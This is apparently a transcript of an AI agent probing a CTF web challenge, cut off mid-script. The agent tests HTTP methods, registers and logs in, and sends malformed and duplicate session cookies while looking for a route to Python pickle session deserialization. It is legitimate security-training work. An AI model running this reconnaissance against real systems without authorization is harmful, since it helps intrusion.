@@ -1,0 +1,2875 @@
+Reading additional input from stdin...
+OpenAI Codex v0.146.0
+--------
+workdir: /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+model: gpt-5.5
+provider: openai
+approval: never
+sandbox: danger-full-access
+reasoning effort: xhigh
+reasoning summaries: none
+session id: 019fbd49-c010-76c2-81e5-0134f3206979
+--------
+user
+Target: http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com:80 . Known pages are /, /login, /register; ordinary route/source enum, weak Flask signer guessing, SSTI/XSS/SQLi basics, username key collisions and empty fields mostly failed. The likely exploit is Redis-backed Python pickle session deserialization requiring any HTTP-side way to write/leak Redis/session/source/secret. Test non-repeated HTTP edge cases such as method/content-type/parser quirks, cookie/session malformed boundary behavior, cache/vhost/proxy headers, safe error or source leaks. Avoid brute force and ordinary wordlist enum. Report FEASIBLE only with concrete primitive or new leak.
+
+协作隔离规则：你是只读试探分支。不要修改 board.md、progress.md、guidance.md、dead_ends.md，也不要创建或修改主线文件；只允许在完成时写入指定的结果文件。
+
+---
+完成后将结果写入 /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee/branch_result_branch_003.md，格式:
+## Branch Result
+direction: http-edge-write-leaks
+subagent_id: branch_003
+status: FEASIBLE | INFEASIBLE
+### 发现
+(列出关键发现)
+### 命令和结果
+(关键命令及其输出)
+### 结论
+(可行/不可行 + 建议)
+warning: `--dangerously-bypass-hook-trust` is enabled. Enabled hooks may run without review for this invocation.
+warning: `--dangerously-bypass-hook-trust` is enabled. Enabled hooks may run without review for this invocation.
+codex
+I’ll treat this as the isolated branch: probe only the HTTP edge cases, avoid file changes until the final branch result, and mark FEASIBLE only if there is a concrete write/leak primitive.
+exec
+/bin/bash -lc 'curl -i -sS --max-time 10 http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/' in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+exec
+/bin/bash -lc 'curl -i -sS --max-time 10 http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/register' in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+ succeeded in 0ms:
+HTTP/1.1 200 OK
+Content-Length: 2067
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=utf-8
+Date: Sat, 01 Aug 2026 12:26:18 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=e6d6dbeb-1572-419c-8c11-5bbc7d687a30.ee1vgHOVC0qBSKd5_Q9jZznmHK4; Expires=Sat, 01-Aug-2026 14:26:18 GMT; HttpOnly; Path=/
+Vary: Accept-Encoding
+
+<!DOCTYPE html>
+<html lang="zh">
+
+<head>
+	<meta charset="UTF-8" />
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no" />
+	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+	<title>Deserialization Register</title>
+	<link rel="stylesheet" type="text/css" href="/static/css/default.css">
+	<link rel="stylesheet" href="/static/css/materialize.min.css">
+	<style type="text/css">
+	html,
+	body {
+	height: 100%;
+	}
+	html {
+	display: table;
+	margin: auto;
+	}
+	body {
+	display: table-cell;
+	vertical-align: middle;
+	}
+	.margin {
+	margin: 0 !important;
+	}
+	</style>
+	<!--[if IE]>
+      <script src="http://libs.useso.com/js/html5shiv/3.7/html5shiv.min.js"></script>
+    <![endif]-->
+</head>
+
+<body class="white">
+	<div id="login-page" class="row">
+		<div class="col s12 z-depth-6 card-panel">
+			<form class="login-form" action="/register" method="POST" style="width:400px;">
+				<div class="row">
+					<div class="input-field col s12 center">
+						<p class="center login-form-text">
+							--------SWPU-CTF WEB Register--------
+						</p>
+					</div>
+				</div>
+				<div class="row margin">
+					<div class="input-field col s12">
+						<i class="mdi-social-person-outline prefix"></i>
+						<input id="username" name="username" type="text" class="validate" placeholder="Username" />
+					</div>
+				</div>
+				<div class="row margin">
+					<div class="input-field col s12">
+						<i class="mdi-action-lock-outline prefix"></i>
+						<input id="password" name="password" type="password" class="validate" placeholder="Password" />
+					</div>
+				</div>
+				<div class="row">
+					<div class="input-field col s12">
+						<input type="submit" value="Register" class="btn waves-effect waves-light col s12" />
+					</div>
+					<div class="input-field col s12">
+						<p class="margin center medium-small sign-up">
+							Already have account? <a href="/login">Login</a>
+						</p>
+					</div>
+				</div>
+			</form>
+		</div>
+	</div>
+	<script src="/static/js/materialize.min.js"></script>
+</body>
+
+</html>
+hook: PostToolUse
+exec
+/bin/bash -lc 'curl -i -sS --max-time 10 http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/login' in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+hook: PostToolUse Completed
+ succeeded in 43ms:
+HTTP/1.1 200 OK
+Content-Length: 2771
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=utf-8
+Date: Sat, 01 Aug 2026 12:26:18 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=8667fb17-8210-4942-b5ad-ba0d820ce438.e8FXCiUP0i15T-GOzuLFCCqHJhI; Expires=Sat, 01-Aug-2026 14:26:18 GMT; HttpOnly; Path=/
+Vary: Accept-Encoding
+
+<!doctype html>
+<html lang="zh">
+<head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Deserialization Login</title>
+        <link rel="stylesheet" type="text/css" href="/static/css/default.css">
+        <link rel="stylesheet" href="/static/css/materialize.min.css">
+        <style type="text/css">
+        html,
+        body {
+            height: 100%;
+        }
+        html {
+            display: table;
+            margin: auto;
+        }
+        body {
+            display: table-cell;
+            vertical-align: middle;
+        }
+
+        .margin {
+          margin: 0 !important;
+        }
+        </style>
+</head>
+<body class="black">
+        <div id="login-page" class="row">
+            <div class="col s12 z-depth-6 card-panel">
+              <form class="login" action="/login" method="post" style="width:450px;">
+                <div class="row">
+                  <div class="input-field col s12 center">
+                    <p class="center login-form-text">--------SWPU-CTF WEB LOGIN--------</p>
+                  </div>
+                </div>
+                <div class="row margin">
+                  <div class="input-field col s12">
+                    <i class="mdi-social-person-outline prefix"></i>
+                    <input name="username" type="text" placeholder="Username">
+                  </div>
+                </div>
+                <div class="row margin">
+                  <div class="input-field col s12">
+                    <i class="mdi-action-lock-outline prefix"></i>
+                    <input id="password" name= "password" type="password" placeholder="Password">
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="input-field col s12 m12 l12  login-text">
+                      <input type="checkbox" id="remember-me" />
+                      <label for="remember-me">Remember me</label>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="input-field col s12">
+                                <input type=submit value=submit class="btn waves-effect waves-light col s12">
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="input-field col s6 m6 l6">
+                    <p class="margin medium-small"><a href="/register">Register now!</a></p>
+                  </div>
+
+              </form>
+            </div>
+          </div>
+          </div>
+
+        <!--materialize js-->
+        <script src="/static/js/materialize.min.js"></script>
+</body>
+</html>
+hook: PostToolUse
+hook: PostToolUse Completed
+ succeeded in 968ms:
+HTTP/1.1 200 OK
+Content-Length: 2771
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=utf-8
+Date: Sat, 01 Aug 2026 12:26:19 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=c00f5379-6fec-4a45-b0da-277634ddcd32.mVgaajPJJeechwE_Wt996NMTtXI; Expires=Sat, 01-Aug-2026 14:26:19 GMT; HttpOnly; Path=/
+Vary: Accept-Encoding
+
+<!doctype html>
+<html lang="zh">
+<head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Deserialization Login</title>
+        <link rel="stylesheet" type="text/css" href="/static/css/default.css">
+        <link rel="stylesheet" href="/static/css/materialize.min.css">
+        <style type="text/css">
+        html,
+        body {
+            height: 100%;
+        }
+        html {
+            display: table;
+            margin: auto;
+        }
+        body {
+            display: table-cell;
+            vertical-align: middle;
+        }
+
+        .margin {
+          margin: 0 !important;
+        }
+        </style>
+</head>
+<body class="black">
+        <div id="login-page" class="row">
+            <div class="col s12 z-depth-6 card-panel">
+              <form class="login" action="/login" method="post" style="width:450px;">
+                <div class="row">
+                  <div class="input-field col s12 center">
+                    <p class="center login-form-text">--------SWPU-CTF WEB LOGIN--------</p>
+                  </div>
+                </div>
+                <div class="row margin">
+                  <div class="input-field col s12">
+                    <i class="mdi-social-person-outline prefix"></i>
+                    <input name="username" type="text" placeholder="Username">
+                  </div>
+                </div>
+                <div class="row margin">
+                  <div class="input-field col s12">
+                    <i class="mdi-action-lock-outline prefix"></i>
+                    <input id="password" name= "password" type="password" placeholder="Password">
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="input-field col s12 m12 l12  login-text">
+                      <input type="checkbox" id="remember-me" />
+                      <label for="remember-me">Remember me</label>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="input-field col s12">
+                                <input type=submit value=submit class="btn waves-effect waves-light col s12">
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="input-field col s6 m6 l6">
+                    <p class="margin medium-small"><a href="/register">Register now!</a></p>
+                  </div>
+
+              </form>
+            </div>
+          </div>
+          </div>
+
+        <!--materialize js-->
+        <script src="/static/js/materialize.min.js"></script>
+</body>
+</html>
+hook: PostToolUse
+hook: PostToolUse Completed
+codex
+The app sets a server-side `session=<uuid>.<sig>` cookie on every anonymous page, with `openresty` in front. I’m checking method handling and parser behavior before touching any payload-heavy tests.
+exec
+/bin/bash -lc 'curl -i -sS --max-time 10 -X OPTIONS http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/login' in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+ succeeded in 0ms:
+HTTP/1.1 200 OK
+Allow: HEAD, GET, POST, OPTIONS
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=utf-8
+Date: Sat, 01 Aug 2026 12:26:30 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=7c6fda96-3f82-405e-8ab7-cc91a5c738d0.IERBAGuBjbJk_aiSfFSFLKnzgOQ; Expires=Sat, 01-Aug-2026 14:26:30 GMT; HttpOnly; Path=/
+Content-Length: 0
+
+
+hook: PostToolUse
+exec
+/bin/bash -lc 'curl -I -sS --max-time 10 http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/login' in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+exec
+/bin/bash -lc 'curl -i -sS --max-time 10 -X TRACE http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/login' in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+hook: PostToolUse Completed
+exec
+/bin/bash -lc 'curl -i -sS --max-time 10 -X PUT http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/login' in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+ succeeded in 320ms:
+HTTP/1.1 405 Not Allowed
+Content-Length: 154
+Connection: keep-alive
+Content-Type: text/html
+Date: Sat, 01 Aug 2026 12:26:30 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+<html>
+<head><title>405 Not Allowed</title></head>
+<body>
+<center><h1>405 Not Allowed</h1></center>
+<hr><center>openresty</center>
+</body>
+</html>
+
+hook: PostToolUse
+hook: PostToolUse Completed
+ succeeded in 475ms:
+HTTP/1.1 405 Method Not Allowed
+Content-Length: 178
+Allow: HEAD, GET, POST, OPTIONS
+Connection: keep-alive
+Content-Type: text/html
+Date: Sat, 01 Aug 2026 12:26:30 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=5736f955-59e2-4cdd-8b32-c3b9f5f753cf.fDJqy1uKIa3473o2x4YHT80Njmc; Expires=Sat, 01-Aug-2026 14:26:30 GMT; HttpOnly; Path=/
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>405 Method Not Allowed</title>
+<h1>Method Not Allowed</h1>
+<p>The method is not allowed for the requested URL.</p>
+
+hook: PostToolUse
+hook: PostToolUse Completed
+ succeeded in 2007ms:
+HTTP/1.1 200 OK
+Content-Length: 2771
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=utf-8
+Date: Sat, 01 Aug 2026 12:26:32 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=97aa623f-e8b9-4551-9963-186dd665fd06.tA93daUZvmODNaSxjhWBCUQwBKM; Expires=Sat, 01-Aug-2026 14:26:32 GMT; HttpOnly; Path=/
+Vary: Accept-Encoding
+
+
+hook: PostToolUse
+hook: PostToolUse Completed
+codex
+Method handling is mostly normal: `GET/POST/HEAD/OPTIONS` only at Flask, `TRACE` blocked by openresty, `PUT` reaches Flask 405. Next I’m checking whether normal registration/login produces any authenticated-only route, debug message, or session value changes worth abusing.
+exec
+/bin/bash -lc "python3 - <<'PY'
+import requests, time
+base='http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com'
+s=requests.Session()
+u='edge'+str(int(time.time()*1000)%100000000)
+p='Pass123"'!'"'
+for step, method, path, data in [
+    ('get_register','GET','/register',None),
+    ('post_register','POST','/register',{'username':u,'password':p}),
+    ('post_login','POST','/login',{'username':u,'password':p}),
+    ('get_root','GET','/',None),
+]:
+    r = s.request(method, base+path, data=data, allow_redirects=False, timeout=10)
+    print('\\n==', step, method, path)
+    print('status', r.status_code, 'loc', r.headers.get('Location'), 'set-cookie', r.headers.get('Set-Cookie'))
+    print('cookies', s.cookies.get_dict())
+    print(r.text[:500].replace('\\n',' ') if r.text else '')
+print('user', u, 'pass', p)
+PY" in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+ succeeded in 955ms:
+
+== get_register GET /register
+status 200 loc None set-cookie session=9f163812-030a-4588-a177-8fff1f395fa0.F3LVXCU2L9e88LYIKML93TBOQ98; Expires=Sat, 01-Aug-2026 14:26:47 GMT; HttpOnly; Path=/
+cookies {'session': '9f163812-030a-4588-a177-8fff1f395fa0.F3LVXCU2L9e88LYIKML93TBOQ98'}
+<!DOCTYPE html> <html lang="zh">  <head> 	<meta charset="UTF-8" /> 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no" /> 	<meta name="viewport" content="width=device-width, initial-scale=1.0" /> 	<title>Deserialization Register</title> 	<link rel="stylesheet" type="text/css" href="/static/css/default.css"> 	<link rel="stylesheet" href="/static/css/materialize.min.css"> 	<style type="text/css"> 	html, 	body { 	height: 100%; 	} 	html { 	displa
+
+== post_register POST /register
+status 302 loc http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/ set-cookie session=9f163812-030a-4588-a177-8fff1f395fa0.F3LVXCU2L9e88LYIKML93TBOQ98; Expires=Sat, 01-Aug-2026 14:26:47 GMT; HttpOnly; Path=/
+cookies {'session': '9f163812-030a-4588-a177-8fff1f395fa0.F3LVXCU2L9e88LYIKML93TBOQ98'}
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"> <title>Redirecting...</title> <h1>Redirecting...</h1> <p>You should be redirected automatically to target URL: <a href="/">/</a>.  If not click the link.
+
+== post_login POST /login
+status 302 loc http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/ set-cookie session=9f163812-030a-4588-a177-8fff1f395fa0.F3LVXCU2L9e88LYIKML93TBOQ98; Expires=Sat, 01-Aug-2026 14:26:48 GMT; HttpOnly; Path=/
+cookies {'session': '9f163812-030a-4588-a177-8fff1f395fa0.F3LVXCU2L9e88LYIKML93TBOQ98'}
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"> <title>Redirecting...</title> <h1>Redirecting...</h1> <p>You should be redirected automatically to target URL: <a href="/">/</a>.  If not click the link.
+
+== get_root GET /
+status 200 loc None set-cookie session=9f163812-030a-4588-a177-8fff1f395fa0.F3LVXCU2L9e88LYIKML93TBOQ98; Expires=Sat, 01-Aug-2026 14:26:48 GMT; HttpOnly; Path=/
+cookies {'session': '9f163812-030a-4588-a177-8fff1f395fa0.F3LVXCU2L9e88LYIKML93TBOQ98'}
+<html> <head> 	<title>Deserialization</title> 	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> <style> .main{     text-align: center; /     background-color: #fff;     border-radius: 20px;     width: 300px;     height: 350px;     margin: auto;     position: absolute;     top: 0;     left: 400px;     right: ;     bottom: 0; } </style> </head> <body> 	<p class="main" style="font-family:arial;color:black;font-size:100px;"><em>Welcome,edge87207362</em></p> </body> <!--没错就是这么简洁~
+user edge87207362 pass Pass123!
+
+hook: PostToolUse
+hook: PostToolUse Completed
+codex
+A normal authenticated session keeps the same UUID cookie and `/` reflects the username. The page also has an HTML comment, so I’m checking whether it contains a useful hint or source residue.
+exec
+/bin/bash -lc "python3 - <<'PY'
+import requests, time
+base='http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com'
+s=requests.Session()
+u='edgefull'+str(int(time.time()*1000)%100000000); p='p'
+s.post(base+'/register', data={'username':u,'password':p}, allow_redirects=False, timeout=10)
+s.post(base+'/login', data={'username':u,'password':p}, allow_redirects=False, timeout=10)
+r=s.get(base+'/', timeout=10)
+print(r.status_code)
+print(r.text)
+PY" in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+ succeeded in 297ms:
+200
+<html>
+<head>
+	<title>Deserialization</title>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<style>
+.main{
+    text-align: center; /
+    background-color: #fff;
+    border-radius: 20px;
+    width: 300px;
+    height: 350px;
+    margin: auto;
+    position: absolute;
+    top: 0;
+    left: 400px;
+    right: ;
+    bottom: 0;
+}
+</style>
+</head>
+<body>
+	<p class="main" style="font-family:arial;color:black;font-size:100px;"><em>Welcome,edgefull87216100</em></p>
+</body>
+<!--没错就是这么简洁~Red*s-->
+</html>
+
+hook: PostToolUse
+hook: PostToolUse Completed
+codex
+I’m now focusing on the signed session boundary. A useful primitive here would be either accepting a caller-chosen session id, producing a stack trace on malformed signature parsing, or letting duplicate cookies confuse the proxy and Flask differently.
+exec
+/bin/bash -lc "curl -i -sS --max-time 10 -H 'Cookie: session=abc' http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/" in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+ succeeded in 0ms:
+HTTP/1.1 200 OK
+Content-Length: 2771
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=utf-8
+Date: Sat, 01 Aug 2026 12:27:26 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=a97b5f97-7ada-46b4-a84d-ede0488b9f9f.P97vaDHtEZ3yYc5tEze_-MSBFJo; Expires=Sat, 01-Aug-2026 14:27:26 GMT; HttpOnly; Path=/
+Vary: Accept-Encoding
+
+<!doctype html>
+<html lang="zh">
+<head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Deserialization Login</title>
+        <link rel="stylesheet" type="text/css" href="/static/css/default.css">
+        <link rel="stylesheet" href="/static/css/materialize.min.css">
+        <style type="text/css">
+        html,
+        body {
+            height: 100%;
+        }
+        html {
+            display: table;
+            margin: auto;
+        }
+        body {
+            display: table-cell;
+            vertical-align: middle;
+        }
+
+        .margin {
+          margin: 0 !important;
+        }
+        </style>
+</head>
+<body class="black">
+        <div id="login-page" class="row">
+            <div class="col s12 z-depth-6 card-panel">
+              <form class="login" action="/login" method="post" style="width:450px;">
+                <div class="row">
+                  <div class="input-field col s12 center">
+                    <p class="center login-form-text">--------SWPU-CTF WEB LOGIN--------</p>
+                  </div>
+                </div>
+                <div class="row margin">
+                  <div class="input-field col s12">
+                    <i class="mdi-social-person-outline prefix"></i>
+                    <input name="username" type="text" placeholder="Username">
+                  </div>
+                </div>
+                <div class="row margin">
+                  <div class="input-field col s12">
+                    <i class="mdi-action-lock-outline prefix"></i>
+                    <input id="password" name= "password" type="password" placeholder="Password">
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="input-field col s12 m12 l12  login-text">
+                      <input type="checkbox" id="remember-me" />
+                      <label for="remember-me">Remember me</label>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="input-field col s12">
+                                <input type=submit value=submit class="btn waves-effect waves-light col s12">
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="input-field col s6 m6 l6">
+                    <p class="margin medium-small"><a href="/register">Register now!</a></p>
+                  </div>
+
+              </form>
+            </div>
+          </div>
+          </div>
+
+        <!--materialize js-->
+        <script src="/static/js/materialize.min.js"></script>
+</body>
+</html>
+hook: PostToolUse
+exec
+/bin/bash -lc "curl -i -sS --max-time 10 -H 'Cookie: session=abc.def' http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/" in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+exec
+/bin/bash -lc "curl -i -sS --max-time 10 -H 'Cookie: session=00000000-0000-0000-0000-000000000000.invalid.sig' http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/" in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+exec
+/bin/bash -lc "curl -i -sS --max-time 10 -H 'Cookie: session=abc; session=def' http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/" in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+hook: PostToolUse Completed
+ succeeded in 33ms:
+HTTP/1.1 200 OK
+Content-Length: 2771
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=utf-8
+Date: Sat, 01 Aug 2026 12:27:26 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=c5f57e54-90c1-41e0-8905-ded8c86e630f.0pa7erGGLMfNF87h3ssmwyK0qVY; Expires=Sat, 01-Aug-2026 14:27:26 GMT; HttpOnly; Path=/
+Vary: Accept-Encoding
+
+<!doctype html>
+<html lang="zh">
+<head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Deserialization Login</title>
+        <link rel="stylesheet" type="text/css" href="/static/css/default.css">
+        <link rel="stylesheet" href="/static/css/materialize.min.css">
+        <style type="text/css">
+        html,
+        body {
+            height: 100%;
+        }
+        html {
+            display: table;
+            margin: auto;
+        }
+        body {
+            display: table-cell;
+            vertical-align: middle;
+        }
+
+        .margin {
+          margin: 0 !important;
+        }
+        </style>
+</head>
+<body class="black">
+        <div id="login-page" class="row">
+            <div class="col s12 z-depth-6 card-panel">
+              <form class="login" action="/login" method="post" style="width:450px;">
+                <div class="row">
+                  <div class="input-field col s12 center">
+                    <p class="center login-form-text">--------SWPU-CTF WEB LOGIN--------</p>
+                  </div>
+                </div>
+                <div class="row margin">
+                  <div class="input-field col s12">
+                    <i class="mdi-social-person-outline prefix"></i>
+                    <input name="username" type="text" placeholder="Username">
+                  </div>
+                </div>
+                <div class="row margin">
+                  <div class="input-field col s12">
+                    <i class="mdi-action-lock-outline prefix"></i>
+                    <input id="password" name= "password" type="password" placeholder="Password">
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="input-field col s12 m12 l12  login-text">
+                      <input type="checkbox" id="remember-me" />
+                      <label for="remember-me">Remember me</label>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="input-field col s12">
+                                <input type=submit value=submit class="btn waves-effect waves-light col s12">
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="input-field col s6 m6 l6">
+                    <p class="margin medium-small"><a href="/register">Register now!</a></p>
+                  </div>
+
+              </form>
+            </div>
+          </div>
+          </div>
+
+        <!--materialize js-->
+        <script src="/static/js/materialize.min.js"></script>
+</body>
+</html>
+hook: PostToolUse
+ succeeded in 44ms:
+HTTP/1.1 200 OK
+Content-Length: 2771
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=utf-8
+Date: Sat, 01 Aug 2026 12:27:26 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=288a7d17-f80d-4fa6-8395-a1539c255b74.20lRETYVmnebWFR3nX39e3NCP6k; Expires=Sat, 01-Aug-2026 14:27:26 GMT; HttpOnly; Path=/
+Vary: Accept-Encoding
+
+<!doctype html>
+<html lang="zh">
+<head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Deserialization Login</title>
+        <link rel="stylesheet" type="text/css" href="/static/css/default.css">
+        <link rel="stylesheet" href="/static/css/materialize.min.css">
+        <style type="text/css">
+        html,
+        body {
+            height: 100%;
+        }
+        html {
+            display: table;
+            margin: auto;
+        }
+        body {
+            display: table-cell;
+            vertical-align: middle;
+        }
+
+        .margin {
+          margin: 0 !important;
+        }
+        </style>
+</head>
+<body class="black">
+        <div id="login-page" class="row">
+            <div class="col s12 z-depth-6 card-panel">
+              <form class="login" action="/login" method="post" style="width:450px;">
+                <div class="row">
+                  <div class="input-field col s12 center">
+                    <p class="center login-form-text">--------SWPU-CTF WEB LOGIN--------</p>
+                  </div>
+                </div>
+                <div class="row margin">
+                  <div class="input-field col s12">
+                    <i class="mdi-social-person-outline prefix"></i>
+                    <input name="username" type="text" placeholder="Username">
+                  </div>
+                </div>
+                <div class="row margin">
+                  <div class="input-field col s12">
+                    <i class="mdi-action-lock-outline prefix"></i>
+                    <input id="password" name= "password" type="password" placeholder="Password">
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="input-field col s12 m12 l12  login-text">
+                      <input type="checkbox" id="remember-me" />
+                      <label for="remember-me">Remember me</label>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="input-field col s12">
+                                <input type=submit value=submit class="btn waves-effect waves-light col s12">
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="input-field col s6 m6 l6">
+                    <p class="margin medium-small"><a href="/register">Register now!</a></p>
+                  </div>
+
+              </form>
+            </div>
+          </div>
+          </div>
+
+        <!--materialize js-->
+        <script src="/static/js/materialize.min.js"></script>
+</body>
+</html>
+hook: PostToolUse
+hook: PostToolUse Completed
+hook: PostToolUse Completed
+ succeeded in 251ms:
+HTTP/1.1 200 OK
+Content-Length: 2771
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=utf-8
+Date: Sat, 01 Aug 2026 12:27:26 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=ab92305f-b241-4eb7-84ab-2a35461f5808.PfbzjpJXGNQxfzHYBuCrHYTpohQ; Expires=Sat, 01-Aug-2026 14:27:26 GMT; HttpOnly; Path=/
+Vary: Accept-Encoding
+
+<!doctype html>
+<html lang="zh">
+<head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Deserialization Login</title>
+        <link rel="stylesheet" type="text/css" href="/static/css/default.css">
+        <link rel="stylesheet" href="/static/css/materialize.min.css">
+        <style type="text/css">
+        html,
+        body {
+            height: 100%;
+        }
+        html {
+            display: table;
+            margin: auto;
+        }
+        body {
+            display: table-cell;
+            vertical-align: middle;
+        }
+
+        .margin {
+          margin: 0 !important;
+        }
+        </style>
+</head>
+<body class="black">
+        <div id="login-page" class="row">
+            <div class="col s12 z-depth-6 card-panel">
+              <form class="login" action="/login" method="post" style="width:450px;">
+                <div class="row">
+                  <div class="input-field col s12 center">
+                    <p class="center login-form-text">--------SWPU-CTF WEB LOGIN--------</p>
+                  </div>
+                </div>
+                <div class="row margin">
+                  <div class="input-field col s12">
+                    <i class="mdi-social-person-outline prefix"></i>
+                    <input name="username" type="text" placeholder="Username">
+                  </div>
+                </div>
+                <div class="row margin">
+                  <div class="input-field col s12">
+                    <i class="mdi-action-lock-outline prefix"></i>
+                    <input id="password" name= "password" type="password" placeholder="Password">
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="input-field col s12 m12 l12  login-text">
+                      <input type="checkbox" id="remember-me" />
+                      <label for="remember-me">Remember me</label>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="input-field col s12">
+                                <input type=submit value=submit class="btn waves-effect waves-light col s12">
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="input-field col s6 m6 l6">
+                    <p class="margin medium-small"><a href="/register">Register now!</a></p>
+                  </div>
+
+              </form>
+            </div>
+          </div>
+          </div>
+
+        <!--materialize js-->
+        <script src="/static/js/materialize.min.js"></script>
+</body>
+</html>
+hook: PostToolUse
+hook: PostToolUse Completed
+exec
+/bin/bash -lc "python3 - <<'PY'
+import requests, time, re
+base='http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com'
+s=requests.Session()
+u='dupc'+str(int(time.time()*1000)%100000000); p='p'
+s.post(base+'/register', data={'username':u,'password':p}, allow_redirects=False, timeout=10)
+s.post(base+'/login', data={'username':u,'password':p}, allow_redirects=False, timeout=10)
+valid=s.cookies.get('session')
+print('valid', valid)
+for label,cookie in [
+    ('valid_only', f'session={valid}'),
